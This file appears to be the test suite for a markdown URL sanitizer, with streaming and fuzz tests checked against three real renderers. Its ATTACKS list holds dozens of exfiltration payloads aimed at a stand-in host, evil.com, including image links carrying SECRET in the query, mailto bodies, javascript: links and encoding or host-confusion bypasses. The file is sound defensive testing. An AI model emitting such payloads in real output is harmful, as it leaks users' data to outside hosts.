import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { micromark } from "micromark";
import { gfm, gfmHtml } from "micromark-extension-gfm";
import MarkdownIt from "markdown-it";
import { marked } from "marked";
import { createStream, sanitize } from "../dist/index.js";

const OPTS = { allowedHosts: ["ok.com", "*.cdn.ok.com"] };

// Three widely used renderers act as the judge: whatever they would turn into a URL must point
// at an allowed host. markdown-it's fuzzy linkify (bare "evil.com") is off; see the README.
const mdit = MarkdownIt({ html: true, linkify: true });
mdit.linkify.set({ fuzzyLink: false, fuzzyEmail: false });
const RENDERERS = {
  micromark: (s) => micromark(s, { allowDangerousHtml: true, extensions: [gfm()], htmlExtensions: [gfmHtml()] }),
  "markdown-it": (s) => mdit.render(s),
  marked: (s) => marked.parse(s, { gfm: true, async: false }),
};

function urlsIn(html) {
  const out = [];
  const decode = (v) => v.replace(/&amp;/g, "&").replace(/&quot;/g, '"').replace(/&#x?([0-9a-f]+);/gi, (e, n) => String.fromCodePoint(parseInt(n, /x/i.test(e) ? 16 : 10)));
  for (const [, body] of html.matchAll(/<[A-Za-z][A-Za-z0-9-]*((?:\s+[^\s=>]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)\s*\/?>/g)) {
    // Attributes in order, so text inside a quoted value (a title, say) is never read as one.
    for (const m of body.matchAll(/\s+([^\s=>]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g)) {
      if (/^(?:src|href|srcset|poster|data|action|formaction|background|cite|xlink:href)$/i.test(m[1])) out.push(decode(m[2] ?? m[3] ?? m[4] ?? ""));
    }
  }
  return out;
}

function unsafeUrls(markdown) {
  const bad = [];
  for (const [name, render] of Object.entries(RENDERERS)) {
    for (const raw of urlsIn(render(markdown))) {
      let u;
      try {
        u = new URL(raw, "https://app.example/page");
      } catch {
        continue; // a browser can't load what it can't parse
      }
      const relative = u.host === "app.example";
      const okHost = u.hostname === "ok.com" || u.hostname.endsWith(".cdn.ok.com");
      if ((u.protocol === "http:" || u.protocol === "https:") && (relative || okHost)) continue;
      bad.push(`${name}: ${raw}`);
    }
  }
  return bad;
}

const ATTACKS = [
  "![x](https://evil.com/?d=SECRET)",
  "![x][r]\n\n[r]: https://evil.com/a.png",
  "![x][]\n\n[x]: https://evil.com/a.png",
  "![x]\n\n[x]: https://evil.com/a.png",
  "![x][r]\n\n[r]:\n  https://evil.com/a.png\n  \"title\"",
  "[click](https://evil.com)",
  "<https://evil.com/x>",
  "<mailto:a@evil.com?body=SECRET>",
  "go to https://evil.com/x?d=1 now",
  "go to HTTPS://EVIL.COM/x now",
  "www.evil.com/x",
  '<img src="https://evil.com/x">',
  "<IMG SRC=https://evil.com/x>",
  "<svg><image href='https://evil.com/x'/></svg>",
  "![x](&#104;ttps://evil.com/a)",
  "![x](https&#58;//evil.com/a)",
  "![x](https&colon;//evil.com/a)",
  "![x](//evil.com/a)",
  "![x](/\\evil.com/a)",
  "![x](\\\\evil.com/a)",
  "![x](https:\\/\\/evil.com/a)",
  "![x](<https://evil.com/a b>)",
  '![x](https://evil.com "title")',
  "![x](  https://evil.com/a  )",
  "![x](https://evil.com/a_(b))",
  "![a [b] c](https://evil.com)",
  "[a\nb](https://evil.com)",
  "[![x](https://evil.com/i)](https://ok.com)",
  "[![x](https://ok.com/i)](https://evil.com)",
  "[link](javascript:alert(1))",
  "![x](data:image/png;base64,AAAA)",
  "![x](https://ok.com.evil.com/a)",
  "![x](https://ok.com@evil.com/a)",
  "![x](https://evil.com#@ok.com)",
  "![x](https://evil。com/a)",
  "`x` [a](https://evil.com) `y`",
  "| a | b |\n|---|---|\n| `x | ![p](https://evil.com/p) | y` | z |",
  "# `a\n[x](https://evil.com) `",
  "> ```\n> ![x](https://evil.com)\n> ```",
  "  ```\n![x](https://evil.com)",
  "![x](https://evil.com/<b>)",
  "[!](https://evil.com)[x](https://ok.com/i.png)",
  "\\![x](https://evil.com)",
  "![x](https://evil.com/\na)",
  "<!-- ![x](https://evil.com) -->",
  "[^1]\n\n[^1]: ![x](https://evil.com/f)",
  "![x](https://evil.com/a\\)b)",
  "[x]: https://evil.com\n[y]: https://ok.com\n\n![a][x] ![b][y]",
];

test("every attack is neutralised, according to three real renderers", () => {
  for (const md of ATTACKS) {
    const { markdown } = sanitize(md, OPTS);
    assert.deepEqual(unsafeUrls(markdown), [], `input: ${JSON.stringify(md)}\noutput: ${JSON.stringify(markdown)}`);
  }
});

test("the attacks are dangerous without the guard (so the judge is working)", () => {
  const caught = ATTACKS.filter((md) => unsafeUrls(md).length > 0);
  assert.ok(caught.length >= 35, `only ${caught.length} attacks were live`);
});

test("allowed links, images, relative URLs and code are left exactly as written", () => {
  const md = [
    "# Report",
    "",
    "See ![chart](https://ok.com/c.png \"Chart\") and [the docs](https://img.cdn.ok.com/d) or [home](/home#top).",
    "",
    "[ref]: https://ok.com/r",
    "Use [ref] and <https://ok.com/auto> and https://ok.com/bare.",
    "",
    "Inline `curl https://evil.com/api` stays, and so does:",
    "",
    "```bash",
    "curl https://evil.com/x ![x](https://evil.com/y)",
    "```",
    "",
    "~~~",
    "<img src=x>",
    "~~~",
    "",
    "| a | b |",
    "|---|---|",
    "| **bold** | _it_ |",
    "",
    "1. Install it:",
    "",
    "   ```bash",
    "   npm i sdk   # see https://evil.com/x",
    "   ```",
    "",
    "2. Set `MAX_SIZE` and `API_URL=https://api.evil.com` in **your** `.env`, then call `my_func(a_b)`.",
    "",
  ].join("\n");
  const { markdown, removed } = sanitize(md, OPTS);
  assert.equal(markdown, md);
  assert.deepEqual(removed, []);
});

test("removed items are reported with a reason", () => {
  const { markdown, removed } = sanitize("![pic](https://evil.com/p) [x](javascript:alert(1)) <b>hi</b>", OPTS);
  assert.equal(markdown, "pic x &lt;b>hi&lt;/b>");
  assert.deepEqual(removed.map((r) => [r.kind, r.reason]), [["image", "host"], ["link", "protocol"], ["html", "html"], ["html", "html"]]);
});

test("options: images off, relative off, html keep, bare URLs keep, isAllowed, replaceImage", () => {
  assert.equal(sanitize("![a](https://ok.com/a.png)", { ...OPTS, images: false }).markdown, "a");
  assert.equal(sanitize("![a][r]\n\n[r]: https://ok.com/a.png", { ...OPTS, images: false }).markdown, "\\![a][r]\n\n[r]: https://ok.com/a.png");
  assert.equal(sanitize("[a](/x)", { ...OPTS, allowRelative: false }).markdown, "a");
  assert.equal(sanitize("<b>x</b>", { ...OPTS, html: "keep" }).markdown, "<b>x</b>");
  assert.equal(sanitize("see https://evil.com", { ...OPTS, bareUrls: "keep" }).markdown, "see https://evil.com");
  assert.equal(sanitize("![a](https://x.test/a)", { isAllowed: (u, kind) => kind === "image" && u.hostname === "x.test" }).markdown, "![a](https://x.test/a)");
  assert.equal(sanitize("![a](https://evil.com/a)", { replaceImage: (alt) => `(image removed: ${alt})` }).markdown, "(image removed: a)");
  const mail = { allowedHosts: ["ok.com"], linkProtocols: ["https:", "mailto:"] };
  assert.equal(sanitize("[a](mailto:x@ok.com) <x@ok.com> x@ok.com", mail).markdown, "[a](mailto:x@ok.com) <x@ok.com> x@ok.com");
  assert.equal(sanitize("[a](mailto:x@evil.com?body=S) <x@evil.com> y@evil.com", mail).markdown, "a x\\@evil.com y\\@evil.com");
});

// ---- streaming ----------------------------------------------------------------------------------

// mulberry32: small, seedable, and good enough to spread fuzz inputs.
function rng(seed) {
  return () => {
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function streamIt(md, opts, rand, check) {
  const s = createStream(opts);
  let out = "";
  for (let i = 0; i < md.length; ) {
    const n = 1 + Math.floor(rand() * 8);
    out += s.write(md.slice(i, i + n));
    i += n;
    if (check) check(out);
  }
  return out + s.end();
}

test("streaming: every intermediate frame a UI would render is safe", () => {
  const rand = rng(7);
  for (const md of ATTACKS) {
    for (let k = 0; k < 15; k++) {
      const out = streamIt(md, OPTS, rand, (frame) => assert.deepEqual(unsafeUrls(frame), [], `partial frame of ${JSON.stringify(md)}: ${JSON.stringify(frame)}`));
      assert.deepEqual(unsafeUrls(out), [], `stream of ${JSON.stringify(md)}: ${JSON.stringify(out)}`);
    }
  }
});

test("streaming gives the same result as sanitizing the whole text", () => {
  const rand = rng(11);
  const doc = ATTACKS.join("\n\n") + "\n\nSee ![ok](https://ok.com/a.png) and `code` and [x](https://ok.com).\n";
  for (let k = 0; k < 50; k++) assert.equal(streamIt(doc, OPTS, rand), sanitize(doc, OPTS).markdown);
});

test("streaming releases text promptly", () => {
  const s = createStream(OPTS);
  assert.equal(s.write("Hello there, "), "Hello there, ");
  assert.equal(s.write("look at ![img](https://ok.com/a"), "look at ");
  assert.equal(s.write(".png) now "), "![img](https://ok.com/a.png) now ");
  assert.equal(s.write("![leak](https://evil.com/?d=SEC"), "");
  assert.equal(s.write("RET) done."), "leak ");
  assert.equal(s.end(), "done.");
  assert.equal(s.removed.length, 1);
});

test("streaming: a stray bracket is released after maxHold, escaped", () => {
  const s = createStream({ ...OPTS, maxHold: 50 });
  let out = s.write("[" + "word ".repeat(20));
  out += s.write("](https://evil.com)") + s.end();
  assert.deepEqual(unsafeUrls(out), []);
  assert.ok(out.startsWith("\\["));
});

// ---- fuzzing ------------------------------------------------------------------------------------

const PIECES = [
  "![", "[", "]", "(", ")", "<", ">", "`", "``", "\n", "\n\n", "https://evil.com/x", "https://ok.com/y", "//evil.com",
  " ", "a", "\\", ":", "]: ", "&#58;", "&#104;", "|", "# ", "```", "~~~", '"', "www.evil.com", "*", "!", "img ", "evil.com",
  "<img src=", "mailto:", "javascript:", "  ", "> ", "- ", "\t", "[^", "&amp;", "ftp://evil.com", "a@evil.com", "https://ok.com/", "\"t\"", "| ",
];

test("fuzz: random markdown soup never renders a blocked URL, whole or streamed", () => {
  const rand = rng(Number(process.env.FUZZ_SEED ?? 1234));
  const runs = Number(process.env.FUZZ_RUNS ?? 2500);
  for (let k = 0; k < runs; k++) {
    let md = "";
    const len = 3 + Math.floor(rand() * Number(process.env.FUZZ_LEN ?? 25));
    for (let i = 0; i < len; i++) md += PIECES[Math.floor(rand() * PIECES.length)];
    const whole = sanitize(md, OPTS).markdown;
    assert.deepEqual(unsafeUrls(whole), [], `input: ${JSON.stringify(md)}\noutput: ${JSON.stringify(whole)}`);
    const streamed = streamIt(md, OPTS, rand);
    assert.deepEqual(unsafeUrls(streamed), [], `streamed input: ${JSON.stringify(md)}\noutput: ${JSON.stringify(streamed)}`);
  }
});

test("CommonJS build exports the same API", () => {
  const cjs = createRequire(import.meta.url)("../dist/index.cjs");
  assert.equal(typeof cjs.sanitize, "function");
  assert.equal(typeof cjs.createStream, "function");
});
